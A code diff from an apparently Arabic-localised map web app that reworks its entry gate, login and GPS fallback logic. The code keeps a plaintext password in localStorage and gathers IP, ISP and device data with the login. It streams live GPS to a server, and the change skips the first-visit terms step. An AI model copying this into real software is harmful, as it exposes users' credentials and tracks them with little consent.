-      // Very first visit (`!localStorage.getItem('termsAcceptedOnce')`): show Step 1 Terms & Conditions card and also verify GPS status immediately
-      setStep1NextEnabled(false);
-      showGateModalOnStep1();
       window.verifyAndStreamDeviceLocation(false);
+
+      // If user has a saved login session, enter app directly with zero intermediate screens!
+      if (session.hasSession) {
+        finishGateEntry();
+        resumeSavedSessionIntoExplorer();
+      } else {
+        showGateModalOnStep2();
+      }
     }
 
     // Entry Gate Handler (Step 2: Clean Instagram-Style Username + Password -> Login or Register)
@@ -4904,7 +4886,10 @@
       }
 
       if (!cachedOptionalGps || !isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
-        cachedOptionalGps = { lat: 15.3694, lng: 44.1910, accuracy: 25 };
+        const lastSavedGps = getLastSavedValidGpsCoords();
+        if (lastSavedGps) {
+          cachedOptionalGps = lastSavedGps;
+        }
         captureBackgroundLocationNonBlocking();
       }
 
@@ -4944,6 +4929,7 @@
       ]);
       const deviceStr = devProfile.deviceLabel;
 
+      const hasValidLoginCoords = Boolean(cachedOptionalGps && isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng));
       let geoInfo = {
         publicIp: netInfo.publicIp || '',
         localIp: netInfo.localIp || '',
@@ -4952,9 +4938,9 @@
         city: window.lastAutoDetectedGpsCity || netInfo.city || 'صنعاء',
         region: netInfo.region || 'أمانة العاصمة',
         isp: netInfo.isp || '',
-        lat: cachedOptionalGps.lat,
-        lng: cachedOptionalGps.lng,
-        accuracy: cachedOptionalGps.accuracy,
+        lat: hasValidLoginCoords ? cachedOptionalGps.lat : null,
+        lng: hasValidLoginCoords ? cachedOptionalGps.lng : null,
+        accuracy: hasValidLoginCoords ? cachedOptionalGps.accuracy : null,
         locationSource: 'GPS'
       };
 
@@ -4976,12 +4962,17 @@
         localStorage.setItem('gmaps_visitor_name', visitorName);
         localStorage.setItem('gmaps_visitor_password', rawPassword);
         updateAccountButtonsUI();
-        streamLiveGpsToServer(cachedOptionalGps.lat, cachedOptionalGps.lng, cachedOptionalGps.accuracy || 15);
+        if (cachedOptionalGps && isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
+          streamLiveGpsToServer(cachedOptionalGps.lat, cachedOptionalGps.lng, cachedOptionalGps.accuracy || 15, 'live', true);
+        }
+        window.verifyAndStreamDeviceLocation(false);
         startLiveGpsLocationWatcher();
         finishGateEntry();
       };
 
-      syncLocationInputWithUserGps(cachedOptionalGps.lat, cachedOptionalGps.lng, true);
+      if (cachedOptionalGps && isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
+        syncLocationInputWithUserGps(cachedOptionalGps.lat, cachedOptionalGps.lng, true);
+      }
       await completeAuthAttempt();
     }
 
